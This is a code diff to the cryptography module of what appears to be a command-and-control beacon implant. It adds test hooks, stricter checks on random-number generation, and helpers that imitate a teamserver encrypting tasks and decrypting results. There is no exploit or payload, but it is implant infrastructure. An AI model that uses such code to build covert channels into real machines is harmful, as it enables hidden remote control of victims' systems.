@@ -4,6 +4,20 @@
 
 #pragma comment(lib, "bcrypt.lib")
 
+#ifdef BEACON_TEST
+static NTSTATUS (WINAPI *g_crypto_random_provider)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG) = BCryptGenRandom;
+
+VOID CryptoTestSetRandomProvider(NTSTATUS (WINAPI *provider)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG))
+{
+    g_crypto_random_provider = provider ? provider : BCryptGenRandom;
+}
+
+VOID CryptoTestResetRandomProvider(VOID)
+{
+    g_crypto_random_provider = BCryptGenRandom;
+}
+#endif
+
 /* 加密信封常量 */
 #define KEY_SIZE 32u
 #define NONCE_SIZE 12u
@@ -25,18 +39,29 @@ static INT GetDwordProp(BCRYPT_HANDLE h, LPCWSTR prop, DWORD* value)
 /* 通过 BCrypt 用加密随机字节填充缓冲区 */
 INT CryptoRandom(VOID* out, SIZE_T len)
 {
-    if (!len) {
+    if (len == 0) {
         return 1;
     }
+    if (!out || len > MAXDWORD) {
+        return 0;
+    }
+#ifdef BEACON_TEST
+    return g_crypto_random_provider(NULL, (PUCHAR)out, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) >= 0;
+#else
     return BCryptGenRandom(NULL, (PUCHAR)out, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) >= 0;
+#endif
 }
 
-/* 生成单个随机 UINT32 值 */
-UINT32 CryptoRandomU32(VOID)
+/* 生成单个随机 UINT32 值，成功写入 out 并返回 TRUE；随机结果为 0 仍是合法值 */
+BOOL CryptoRandomU32(UINT32* out)
 {
-    UINT32 v = 0;
-    CryptoRandom(&v, sizeof(v));
-    return v;
+    UINT32 v;
+
+    if (!out) return FALSE;
+    if (!CryptoRandom(&v, sizeof(v))) return FALSE;
+
+    *out = v;
+    return TRUE;
 }
 
 /* 使用给定密钥对数据计算 HMAC-SHA256，将 MAC 追加到 out */
@@ -344,3 +369,33 @@ INT CryptoEncryptResult(const BYTE8* session_key, SIZE_T session_key_len, const 
     SecureZeroMemory(key, sizeof(key));
     return ok;
 }
+
+#ifdef BEACON_TEST
+/* 测试专用：模拟 teamserver 使用 TASK purpose 加密下发任务。 */
+INT CryptoTestEncryptTask(const BYTE8* session_key, SIZE_T session_key_len,
+                          const ByteBuf* plain, ByteBuf* out)
+{
+    BYTE8 key[KEY_SIZE];
+    INT ok;
+
+    BbInit(out);
+    ok = DeriveKey(session_key, session_key_len, PURPOSE_TASK, key) &&
+         AesGcmSeal(key, plain->data, plain->len, PURPOSE_TASK, out);
+    SecureZeroMemory(key, sizeof(key));
+    return ok;
+}
+
+/* 测试专用：模拟 teamserver 使用 RESULT purpose 解密结果。 */
+INT CryptoTestDecryptResult(const BYTE8* session_key, SIZE_T session_key_len,
+                            const ByteBuf* env, ByteBuf* out)
+{
+    BYTE8 key[KEY_SIZE];
+    INT ok;
+
+    BbInit(out);
+    ok = DeriveKey(session_key, session_key_len, PURPOSE_RESULT, key) &&
+         AesGcmOpen(key, env->data, env->len, PURPOSE_RESULT, out);
+    SecureZeroMemory(key, sizeof(key));
+    return ok;
+}
+#endif
